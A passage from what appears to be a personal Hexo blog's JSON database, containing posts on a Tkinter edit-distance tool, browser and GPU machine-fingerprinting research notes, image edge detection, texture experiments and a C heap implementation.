BooleanVar()</span><br><span class=\"line\">        Checkbutton(frm_R, text = <span class=\"string\">\"alignment\"</span>, height = <span class=\"number\">2</span>, width = <span class=\"number\">18</span>, anchor = W, variable = <span class=\"keyword\">self</span>.align).pack(side = TOP, anchor = W)</span><br><span class=\"line\"></span><br><span class=\"line\">        convert = Frame(<span class=\"keyword\">self</span>)</span><br><span class=\"line\">        Button(convert, text = <span class=\"string\">\"Compare\"</span>, command = <span class=\"keyword\">self</span>.cal).pack()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">#this is the output part</span></span><br><span class=\"line\">        output = LabelFrame(<span class=\"keyword\">self</span>, text = <span class=\"string\">\"Output\"</span>, padx = <span class=\"number\">10</span>)</span><br><span class=\"line\">        Disfrm = Frame(output, padx = <span class=\"number\">10</span>, pady = <span class=\"number\">5</span>)</span><br><span class=\"line\">        Label(Disfrm, text = <span class=\"string\">\"Distance\"</span>, padx = <span class=\"number\">10</span>).pack(side = LEFT)</span><br><span class=\"line\">        <span class=\"keyword\">self</span>.Dis = Entry(Disfrm, width = <span class=\"number\">10</span>)</span><br><span class=\"line\">        <span class=\"keyword\">self</span>.Dis.pack(side = LEFT)</span><br><span class=\"line\">        Disfrm.pack(side = TOP)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">#get three textboxes which is the full edit, backtrack matrix and alignment text boxes</span></span><br><span class=\"line\">        <span class=\"keyword\">self</span>.FD = <span class=\"keyword\">self</span>.getOut(<span class=\"string\">\"full edit\"</span>, output)</span><br><span class=\"line\">        <span class=\"keyword\">self</span>.BM = <span class=\"keyword\">self</span>.getOut(<span class=\"string\">\"backtrack matrix\"</span>, output)</span><br><span class=\"line\">        <span class=\"keyword\">self</span>.AL = <span class=\"keyword\">self</span>.getOut(<span class=\"string\">\"alignment\"</span>, output)</span><br><span class=\"line\"></span><br><span class=\"line\">        frm_L.pack(side = LEFT)</span><br><span class=\"line\">        frm_M.pack(side = LEFT)</span><br><span class=\"line\">        frm_R.pack(side = LEFT)</span><br><span class=\"line\"></span><br><span class=\"line\">        Input.pack()</span><br><span class=\"line\">        convert.pack()</span><br><span class=\"line\">        output.pack()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name_<span class=\"number\">_</span> == <span class=\"string\">\"__main__\"</span>:</span><br><span class=\"line\">    root = Tk()</span><br><span class=\"line\">    root.title(<span class=\"string\">\"Distance Calculator\"</span>)</span><br><span class=\"line\">    root.geometry(<span class=\"string\">\"900x700\"</span>)</span><br><span class=\"line\">    root.resizable(width = True, height = True)</span><br><span class=\"line\"></span><br><span class=\"line\">    app = application(root)</span><br><span class=\"line\">    root.mainloop()</span><br></pre></td></tr></table></figure></p>"},{"title":"Feb25-28","date":"2016-02-26T01:36:32.000Z","_content":"This is the idea and the time line from Feb25-Feb28\n<!--more-->\n## Feb25 ##\n[How GPUs Work](https://www.cs.virginia.edu/~gfx/papers/pdfs/59_HowThingsWork.pdf)\n[The Web Never Forgets](https://securehomes.esat.kuleuven.be/~gacar/persistent/the_web_never_forgets.pdf)\n[Pixel Perfect](https://cseweb.ucsd.edu/~hovav/dist/canvas.pdf)\nMainly 1, setup the OpenGl environment; 2, reading somepapers. There is something new:\n### New hints ###\n- May use self-defined webfonts test the Graph card and drivers\n- What is ISO standard 12233? It should be a lens resolution measurement way\n- Try to use other characters such as Chinese, Japniese and so on to get a higher entorpy\n- What is Unicode U+1F603? Can this be used as a feature\n- So many paper have used the \"default font\" as a feature\n\n\n\n### Graphic card ###\n\nIn the world of graphic card, everything is made of triangles. The deveopers uses graphics library (OpenGL, DriectX) to provide each triangle to the graphics pipeline one vertex at a time. After that, the graphic card will do something:\n- Model transformations (by homogeneous coordinates)\n- Lighting, handles multiple lights by summing the contributions of each individual light\n- Camera simulation, use matrix-vector multiplication\n- Rasterization\n- Texturing\n- Hidden surfaces\n","source":"_posts/Feb2528.md","raw":"title: Feb25-28\ndate: 2016-02-26 01:36:32\ntags:\ncategories: Machine FingerPrinting \n---\nThis is the idea and the time line from Feb25-Feb28\n<!--more-->\n## Feb25 ##\n[How GPUs Work](https://www.cs.virginia.edu/~gfx/papers/pdfs/59_HowThingsWork.pdf)\n[The Web Never Forgets](https://securehomes.esat.kuleuven.be/~gacar/persistent/the_web_never_forgets.pdf)\n[Pixel Perfect](https://cseweb.ucsd.edu/~hovav/dist/canvas.pdf)\nMainly 1, setup the OpenGl environment; 2, reading somepapers. There is something new:\n### New hints ###\n- May use self-defined webfonts test the Graph card and drivers\n- What is ISO standard 12233? It should be a lens resolution measurement way\n- Try to use other characters such as Chinese, Japniese and so on to get a higher entorpy\n- What is Unicode U+1F603? Can this be used as a feature\n- So many paper have used the \"default font\" as a feature\n\n\n\n### Graphic card ###\n\nIn the world of graphic card, everything is made of triangles. The deveopers uses graphics library (OpenGL, DriectX) to provide each triangle to the graphics pipeline one vertex at a time. After that, the graphic card will do something:\n- Model transformations (by homogeneous coordinates)\n- Lighting, handles multiple lights by summing the contributions of each individual light\n- Camera simulation, use matrix-vector multiplication\n- Rasterization\n- Texturing\n- Hidden surfaces\n","slug":"Feb2528","published":1,"updated":"2016-06-08T20:21:15.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciph681ue000ewypd8ofwjhf2","content":"<p>This is the idea and the time line from Feb25-Feb28<br><a id=\"more\"></a></p>\n<h2 id=\"Feb25\"><a href=\"#Feb25\" class=\"headerlink\" title=\"Feb25\"></a>Feb25</h2><p><a href=\"https://www.cs.virginia.edu/~gfx/papers/pdfs/59_HowThingsWork.pdf\" target=\"_blank\" rel=\"external\">How GPUs Work</a><br><a href=\"https://securehomes.esat.kuleuven.be/~gacar/persistent/the_web_never_forgets.pdf\" target=\"_blank\" rel=\"external\">The Web Never Forgets</a><br><a href=\"https://cseweb.ucsd.edu/~hovav/dist/canvas.pdf\" target=\"_blank\" rel=\"external\">Pixel Perfect</a><br>Mainly 1, setup the OpenGl environment; 2, reading somepapers. There is something new:</p>\n<h3 id=\"New-hints\"><a href=\"#New-hints\" class=\"headerlink\" title=\"New hints\"></a>New hints</h3><ul>\n<li>May use self-defined webfonts test the Graph card and drivers</li>\n<li>What is ISO standard 12233? It should be a lens resolution measurement way</li>\n<li>Try to use other characters such as Chinese, Japniese and so on to get a higher entorpy</li>\n<li>What is Unicode U+1F603? Can this be used as a feature</li>\n<li>So many paper have used the “default font” as a feature</li>\n</ul>\n<h3 id=\"Graphic-card\"><a href=\"#Graphic-card\" class=\"headerlink\" title=\"Graphic card\"></a>Graphic card</h3><p>In the world of graphic card, everything is made of triangles. The deveopers uses graphics library (OpenGL, DriectX) to provide each triangle to the graphics pipeline one vertex at a time. After that, the graphic card will do something:</p>\n<ul>\n<li>Model transformations (by homogeneous coordinates)</li>\n<li>Lighting, handles multiple lights by summing the contributions of each individual light</li>\n<li>Camera simulation, use matrix-vector multiplication</li>\n<li>Rasterization</li>\n<li>Texturing</li>\n<li>Hidden surfaces</li>\n</ul>\n","excerpt":"<p>This is the idea and the time line from Feb25-Feb28<br>","more":"</p>\n<h2 id=\"Feb25\"><a href=\"#Feb25\" class=\"headerlink\" title=\"Feb25\"></a>Feb25</h2><p><a href=\"https://www.cs.virginia.edu/~gfx/papers/pdfs/59_HowThingsWork.pdf\">How GPUs Work</a><br><a href=\"https://securehomes.esat.kuleuven.be/~gacar/persistent/the_web_never_forgets.pdf\">The Web Never Forgets</a><br><a href=\"https://cseweb.ucsd.edu/~hovav/dist/canvas.pdf\">Pixel Perfect</a><br>Mainly 1, setup the OpenGl environment; 2, reading somepapers. There is something new:</p>\n<h3 id=\"New-hints\"><a href=\"#New-hints\" class=\"headerlink\" title=\"New hints\"></a>New hints</h3><ul>\n<li>May use self-defined webfonts test the Graph card and drivers</li>\n<li>What is ISO standard 12233? It should be a lens resolution measurement way</li>\n<li>Try to use other characters such as Chinese, Japniese and so on to get a higher entorpy</li>\n<li>What is Unicode U+1F603? Can this be used as a feature</li>\n<li>So many paper have used the “default font” as a feature</li>\n</ul>\n<h3 id=\"Graphic-card\"><a href=\"#Graphic-card\" class=\"headerlink\" title=\"Graphic card\"></a>Graphic card</h3><p>In the world of graphic card, everything is made of triangles. The deveopers uses graphics library (OpenGL, DriectX) to provide each triangle to the graphics pipeline one vertex at a time. After that, the graphic card will do something:</p>\n<ul>\n<li>Model transformations (by homogeneous coordinates)</li>\n<li>Lighting, handles multiple lights by summing the contributions of each individual light</li>\n<li>Camera simulation, use matrix-vector multiplication</li>\n<li>Rasterization</li>\n<li>Texturing</li>\n<li>Hidden surfaces</li>\n</ul>"},{"title":"Get Edge And Subtract","date":"2016-04-24T19:13:35.000Z","_content":"Pictures about edge detection:\nmainly use PIL to handle pictures, use filter to filter edges, then add the edges and the original pictures together\n<!--more-->\n## Origin ##\n![](/image/machine_fingerprinting/origin.png)\n## Edge ##\n![](/image/machine_fingerprinting/edge.png)\n## Subtract ##\n![](/image/machine_fingerprinting/result.png)\n","source":"_posts/Get-Edge-And-Subtract.md","raw":"---\ntitle: Get Edge And Subtract\ndate: 2016-04-24 19:13:35\ntags: Machine Fingerprinting\n---\nPictures about edge detection:\nmainly use PIL to handle pictures, use filter to filter edges, then add the edges and the original pictures together\n<!--more-->\n## Origin ##\n![](/image/machine_fingerprinting/origin.png)\n## Edge ##\n![](/image/machine_fingerprinting/edge.png)\n## Subtract ##\n![](/image/machine_fingerprinting/result.png)\n","slug":"Get-Edge-And-Subtract","published":1,"updated":"2016-06-08T20:21:15.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciph681uf000hwypdqrovdp4f","content":"<p>Pictures about edge detection:<br>mainly use PIL to handle pictures, use filter to filter edges, then add the edges and the original pictures together<br><a id=\"more\"></a></p>\n<h2 id=\"Origin\"><a href=\"#Origin\" class=\"headerlink\" title=\"Origin\"></a>Origin</h2><p><img src=\"/image/machine_fingerprinting/origin.png\" alt=\"\"></p>\n<h2 id=\"Edge\"><a href=\"#Edge\" class=\"headerlink\" title=\"Edge\"></a>Edge</h2><p><img src=\"/image/machine_fingerprinting/edge.png\" alt=\"\"></p>\n<h2 id=\"Subtract\"><a href=\"#Subtract\" class=\"headerlink\" title=\"Subtract\"></a>Subtract</h2><p><img src=\"/image/machine_fingerprinting/result.png\" alt=\"\"></p>\n","excerpt":"<p>Pictures about edge detection:<br>mainly use PIL to handle pictures, use filter to filter edges, then add the edges and the original pictures together<br>","more":"</p>\n<h2 id=\"Origin\"><a href=\"#Origin\" class=\"headerlink\" title=\"Origin\"></a>Origin</h2><p><img src=\"/image/machine_fingerprinting/origin.png\" alt=\"\"></p>\n<h2 id=\"Edge\"><a href=\"#Edge\" class=\"headerlink\" title=\"Edge\"></a>Edge</h2><p><img src=\"/image/machine_fingerprinting/edge.png\" alt=\"\"></p>\n<h2 id=\"Subtract\"><a href=\"#Subtract\" class=\"headerlink\" title=\"Subtract\"></a>Subtract</h2><p><img src=\"/image/machine_fingerprinting/result.png\" alt=\"\"></p>"},{"title":"Gradient Experiment about textures","date":"2016-05-12T22:27:27.000Z","_content":"\nSome tests about different textures:\n<!--more-->\nthis is the curve of different textures:\n## random color for every pixels From white to No_white ##\nChrome_4 computers\n![](/image/machine_fingerprinting/curve_white_to_no_white.png)\nChrome_4 computers_susan_texture\n![](/image/machine_fingerprinting/susan_point_to_all.png)\nChrome_4 computers_cube_texture\n![](/image/machine_fingerprinting/cube_point_to_all.png)\nChrome_4 computers_cube_power\n![](/image/machine_fingerprinting/cube_power.png)\nChrome_4 computers_susan_power\n![](/image/machine_fingerprinting/susan_power.png)\nChrome_4 computers_simple_transparent\n![](/image/machine_fingerprinting/transparent.png)\n","source":"_posts/Gradient-Experiment-about-textures.md","raw":"---\ntitle: Gradient Experiment about textures\ndate: 2016-05-12 22:27:27\ntags: Machine Fingerprinting\n---\n\nSome tests about different textures:\n<!--more-->\nthis is the curve of different textures:\n## random color for every pixels From white to No_white ##\nChrome_4 computers\n![](/image/machine_fingerprinting/curve_white_to_no_white.png)\nChrome_4 computers_susan_texture\n![](/image/machine_fingerprinting/susan_point_to_all.png)\nChrome_4 computers_cube_texture\n![](/image/machine_fingerprinting/cube_point_to_all.png)\nChrome_4 computers_cube_power\n![](/image/machine_fingerprinting/cube_power.png)\nChrome_4 computers_susan_power\n![](/image/machine_fingerprinting/susan_power.png)\nChrome_4 computers_simple_transparent\n![](/image/machine_fingerprinting/transparent.png)\n","slug":"Gradient-Experiment-about-textures","published":1,"updated":"2016-06-08T20:21:15.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciph681ui000jwypdkkwt0oig","content":"<p>Some tests about different textures:<br><a id=\"more\"></a><br>this is the curve of different textures:</p>\n<h2 id=\"random-color-for-every-pixels-From-white-to-No-white\"><a href=\"#random-color-for-every-pixels-From-white-to-No-white\" class=\"headerlink\" title=\"random color for every pixels From white to No_white\"></a>random color for every pixels From white to No_white</h2><p>Chrome_4 computers<br><img src=\"/image/machine_fingerprinting/curve_white_to_no_white.png\" alt=\"\"><br>Chrome_4 computers_susan_texture<br><img src=\"/image/machine_fingerprinting/susan_point_to_all.png\" alt=\"\"><br>Chrome_4 computers_cube_texture<br><img src=\"/image/machine_fingerprinting/cube_point_to_all.png\" alt=\"\"><br>Chrome_4 computers_cube_power<br><img src=\"/image/machine_fingerprinting/cube_power.png\" alt=\"\"><br>Chrome_4 computers_susan_power<br><img src=\"/image/machine_fingerprinting/susan_power.png\" alt=\"\"><br>Chrome_4 computers_simple_transparent<br><img src=\"/image/machine_fingerprinting/transparent.png\" alt=\"\"></p>\n","excerpt":"<p>Some tests about different textures:<br>","more":"<br>this is the curve of different textures:</p>\n<h2 id=\"random-color-for-every-pixels-From-white-to-No-white\"><a href=\"#random-color-for-every-pixels-From-white-to-No-white\" class=\"headerlink\" title=\"random color for every pixels From white to No_white\"></a>random color for every pixels From white to No_white</h2><p>Chrome_4 computers<br><img src=\"/image/machine_fingerprinting/curve_white_to_no_white.png\" alt=\"\"><br>Chrome_4 computers_susan_texture<br><img src=\"/image/machine_fingerprinting/susan_point_to_all.png\" alt=\"\"><br>Chrome_4 computers_cube_texture<br><img src=\"/image/machine_fingerprinting/cube_point_to_all.png\" alt=\"\"><br>Chrome_4 computers_cube_power<br><img src=\"/image/machine_fingerprinting/cube_power.png\" alt=\"\"><br>Chrome_4 computers_susan_power<br><img src=\"/image/machine_fingerprinting/susan_power.png\" alt=\"\"><br>Chrome_4 computers_simple_transparent<br><img src=\"/image/machine_fingerprinting/transparent.png\" alt=\"\"></p>"},{"title":"Heap insertion and deletion in C","date":"2015-10-20T20:22:43.000Z","_content":"It's a program about basic insertion and deletion of a heap.(include heapify)\nIt's insertion and deletion time complexity is $O(logn)$\nOnce I finished this code and began to run, it runs without bug.\nWhich means I finished this code Without any debuging~\nI spent half an hour to write this program\nThis is a *small top* heap\n<!--more-->\n```\n#include <stdio.h>\n#define MAX 1000\nvoid swap(int * a,int * b){\n    int tmp = *a;\n    *a = *b;\n    *b = tmp;\n}\nvoid siftdown(int * line, int n,int root){\n    int sift = root;\n    while(root < n){\n        sift = root << 1 | 1;\n        if(sift + 1 < n && line[sift + 1] < line[sift]) ++ sift;\n        if(sift < n && line[root] > line[sift]) {\n            swap(&line[root], &line[sift]);\n            root = sift;\n        }else break;\n    }\n}\nvoid heapify(int * line, int n){\n    int now = (n - 2) >> 1;\n    for(int i = now;i >= 0;-- i){\n        siftdown(line, n, i);\n    }\n    return ;\n}\nvoid del(int * line, int n){\n    line[0] = line[n - 1];\n    siftdown(line, n - 1, 0);\n}\nvoid siftup(int * line, int n){\n    int sift = n;\n    while(n){\n        sift = (n - 1) >> 1;\n        if(line[sift] > line[n]) swap(&line[sift],&line[n]), n = sift;\n        else break; \n    }\n}\nvoid insert(int * line, int n, int a){\n    line[n] = a;\n    siftup(line, n);\n}\nvoid output(int * line, int n){\n    for(int i = 0;i < n;++ i) printf(\"%d \",line[i]);\n    printf(\"\\n\");\n    return ;\n}\nint main(){\n    int n,tmp;\n    int line[MAX];\n    scanf(\"%d\",&n);\n    for(int i = 0;i < n;++ i){\n        scanf(\"%d\",&line[i]);\n    }\n    heapify(line, n);\n    output(line, n);\n    printf(\"1 a for insert a, 0 for delete the heap top\\n\");\n    while(1){\n        scanf(\"%d\",&tmp);\n        if(tmp){\n            scanf(\"%d\",&tmp);\n            insert(line, n ++, tmp);\n        }else if(n > 0) del(line, n --);\n        else printf(\"No number left\\n\");\n        output(line, n);\n    }\n}\n```\n","source":"_posts/HeapinsertionanddeletioninC.md","raw":"title: \"Heap insertion and deletion in C\"\ndate: 2015-10-20 20:22:43\ntags: Algorithm\n---\nIt's a program about basic insertion and deletion of a heap.(include heapify)\nIt's insertion and deletion time complexity is $O(logn)$\nOnce I finished this code and began to run, it runs without bug.\nWhich means I finished this code Without any debuging~\nI spent half an hour to write this program\nThis is a *small top* heap\n<!--more-->\n```\n#include <stdio.h>\n#define MAX 1000\nvoid swap(int * a,int * b){\n    int tmp = *a;\n    *a = *b;\n    *b = tmp;\n}\nvoid siftdown(int * line, int n,int root){\n    int sift = root;\n    while(root < n){\n        sift = root << 1 | 1;\n        if(sift + 1 < n && line[sift + 1] < line[sift]) ++ sift;\n        if(sift < n && line[root] > line[sift]) {\n            swap(&line[root], &line[sift]);\n            root = sift;\n        }else break;\n    }\n}\nvoid heapify(int * line, int n){\n    int now = (n - 2) >> 1;\n    for(int i = now;i >= 0;-- i){\n        siftdown(line, n, i);\n    }\n    return ;\n}\nvoid del(int * line, int n){\n    line[0] = line[n - 1];\n    siftdown(line, n - 1, 0);\n}\nvoid siftup(int * line, int n){\n    int sift = n;\n    while(n){\n        sift = (n - 1) >> 1;\n        if(line[sift] > line[n]) swap(&line[sift],&line[n]), n = sift;\n        else break; \n    }\n}\nvoid insert(int * line, int n, int a){\n    line[n] = a;\n    siftup(line, n);\n}\nvoid output(int * line, int n){\n    for(int i = 0;i < n;++ i) printf(\"%d \",line[i]);\n    printf(\"\\n\");\n    return ;\n}\nint main(){\n    int n,tmp;\n    int line[MAX];\n    scanf(\"%d\",&n);\n    for(int i = 0;i < n;++ i){\n        scanf(\"%d\",&line[i]);\n    }\n    heapify(line, n);\n    output(line, n);\n    printf(\"1 a for insert a, 0 for delete the heap top\\n\");\n    while(1){\n        scanf(\"%d\",&tmp);\n        if(tmp){\n            scanf(\"%d\",&tmp);\n            insert(line, n ++, tmp);\n        }else if(n > 0) del(line, n --);\n        else printf(\"No number left\\n\");\n        output(line, n);\n    }\n}\n```\n","slug":"HeapinsertionanddeletioninC","published":1,"updated":"2016-06-08T20:21:15.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciph681uk000lwypdpmmq6085","content":"<p>It’s a program about basic insertion and deletion of a heap.(include heapify)<br>It’s insertion and deletion time complexity is $O(logn)$<br>Once I finished this code and began to run, it runs without bug.<br>Which means I finished this code Without any debuging~<br>I spent half an hour to write this program<br>This is a <em>small top</em> heap<br><a id=\"more\"></a><br><figure class=\"highlight arduino\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> MAX 1000</span></span><br><span class=\"line\"><span class=\"keyword\">void</span> swap(<span class=\"keyword\">int</span> * a,<span class=\"keyword\">int</span> * b)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> tmp = *a;</span><br><span class=\"line\">    *a = *b;</span><br><span class=\"line\">    *b = tmp;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">void</span> siftdown(<span class=\"keyword\">int</span> * <span class=\"built_in\">line</span>, <span class=\"keyword\">int</span> n,<span class=\"keyword\">int</span> root)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> sift = root;</span><br><span class=\"line\">    <span class=\"built_in\">while</span>(root &lt; n)&#123;</span><br><span class=\"line\">        sift = root &lt;&lt; <span class=\"number\">1</span> | <span class=\"number\">1</span>;</span><br><span class=\"line\">        <span class=\"built_in\">if</span>(sift + <span class=\"number\">1</span> &lt; n &amp;&amp; <span class=\"built_in\">line</span>[sift + <span class=\"number\">1</span>] &lt; <span class=\"built_in\">line</span>[sift]) ++ sift;</span><br><span class=\"line\">        <span class=\"built_in\">if</span>(sift &lt; n &amp;&amp; <span class=\"built_in\">line</span>[root] &gt; <span class=\"built_in\">line</span>[sift]) &#123;</span><br><span class=\"line\">            swap(&amp;<span class=\"built_in\">line</span>[root], &amp;<span class=\"built_in\">line</span>[sift]);</span><br><span class=\"line\">            root = sift;</span><br><span class=\"line\">        &#125;<span class=\"built_in\">else</span> <span class=\"built_in\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">void</span> heapify(<span class=\"keyword\">int</span> * <span class=\"built_in\">line</span>, <span class=\"keyword\">int</span> n)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> now = (n - <span class=\"number\">2</span>) &gt;&gt; <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"built_in\">for</span>(<span class=\"keyword\">int</span> i = now;i &gt;= <span class=\"number\">0</span>;-- i)&#123;</span><br><span class=\"line\">        siftdown(<span class=\"built_in\">line</span>, n, i);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">return</span> ;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">void</span> del(<span class=\"keyword\">int</span> * <span class=\"built_in\">line</span>, <span class=\"keyword\">int</span> n)&#123;</span><br><span class=\"line\">    <span class=\"built_in\">line</span>[<span class=\"number\">0</span>] = <span class=\"built_in\">line</span>[n - <span class=\"number\">1</span>];</span><br><span class=\"line\">    siftdown(<span class=\"built_in\">line</span>, n - <span class=\"number\">1</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">void</span> siftup(<span class=\"keyword\">int</span> * <span class=\"built_in\">line</span>, <span class=\"keyword\">int</span> n)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> sift = n;</span><br><span class=\"line\">    <span class=\"built_in\">while</span>(n)&#123;</span><br><span class=\"line\">        sift = (n - <span class=\"number\">1</span>) &gt;&gt; <span class=\"number\">1</span>;</span><br><span class=\"line\">        <span class=\"built_in\">if</span>(<span class=\"built_in\">line</span>[sift] &gt; <span class=\"built_in\">line</span>[n]) swap(&amp;<span class=\"built_in\">line</span>[sift],&amp;<span class=\"built_in\">line</span>[n]), n = sift;</span><br><span class=\"line\">        <span class=\"built_in\">else</span> <span class=\"built_in\">break</span>; </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">void</span> insert(<span class=\"keyword\">int</span> * <span class=\"built_in\">line</span>, <span class=\"keyword\">int</span> n, <span class=\"keyword\">int</span> a)&#123;</span><br><span class=\"line\">    <span class=\"built_in\">line</span>[n] = a;</span><br><span class=\"line\">    siftup(<span class=\"built_in\">line</span>, n);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">void</span> output(<span class=\"keyword\">int</span> * <span class=\"built_in\">line</span>, <span class=\"keyword\">int</span> n)&#123;</span><br><span class=\"line\">    <span class=\"built_in\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>;i &lt; n;++ i) printf(<span class=\"string\">\"%d \"</span>,<span class=\"built_in\">line</span>[i]);</span><br><span class=\"line\">    printf(<span class=\"string\">\"\\n\"</span>);</span><br><span class=\"line\">    <span class=\"built_in\">return</span> ;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">int</span> main()&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> n,tmp;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> <span class=\"built_in\">line</span>[MAX];</span><br><span class=\"line\">    scanf(<span class=\"string\">\"%d\"</span>,&amp;n);</span><br><span class=\"line\">    <span class=\"built_in\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>;i &lt; n;++ i)&#123;</span><br><span class=\"line\">        scanf(<span class=\"string\">\"%d\"</span>,&amp;<span class=\"built_in\">line</span>[i]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    heapify(<span class=\"built_in\">line</span>, n);</span><br><span class=\"line\">    output(<span class=\"built_in\">line</span>, n);</span><br><span class=\"line\">    printf(<span class=\"string\">\"1 a for insert a, 0 for delete the heap top\\n\"</span>);</span><br><span class=\"line\">    <span class=\"built_in\">while</span>(<span class=\"number\">1</span>)&#123;</span><br><span class=\"line\">        scanf(<span class=\"string\">\"%d\"</span>,&amp;tmp);</span><br><span class=\"line\">        <span class=\"built_in\">if</span>(tmp)&#123;</span><br><span class=\"line\">            scanf(<span class=\"string\">\"%d\"</span>,&amp;tmp);</span><br><span class=\"line\">            insert(<span class=\"built_in\">line</span>, n ++, tmp);</span><br><span class=\"line\">        &#125;<span class=\"built_in\">else</span> <span class=\"built_in\">if</span>(n &gt; <span class=\"number\">0</span>) del(<span class=\"built_in\">line</span>, n --);</span><br><span class=\"line\">        <span class=\"built_in\">else</span> printf(<span class=\"string\">\"No number left\\n\"</span>);</span><br><span class=\"line\">        output(<span class=\"built_in\">line</span>, n);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n","excerpt":"<p>It’s a program about basic insertion and deletion of a heap.(include heapify)<br>It’s insertion and deletion time complexity is $O(logn)$<br>Once I finished this code and began to run, it runs without bug.<br>Which means I finished this code Without any debuging~<br>I spent half an hour to write this program<br>This is a <em>small top</em> heap<br>","more":"<br><figure class=\"highlight arduino\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span 